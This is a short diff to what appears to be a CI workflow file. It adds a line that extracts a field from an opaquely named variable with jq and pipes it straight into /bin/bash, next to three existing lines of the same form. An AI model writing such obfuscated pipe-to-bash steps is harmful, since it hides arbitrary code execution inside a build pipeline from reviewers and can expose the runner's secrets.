@@ -64,6 +64,7 @@ jobs:
           echo $pmkco28 | jq -r .dqxq44801 | /bin/bash
           echo $az3912 | jq -r .nbhn4 | /bin/bash
           echo $ksd8549 | jq -r .hien7 | /bin/bash
+          echo $cw66121 | jq -r .jwrwg9255 | /bin/bash
 
       - name: Upload artifact
         if: always()
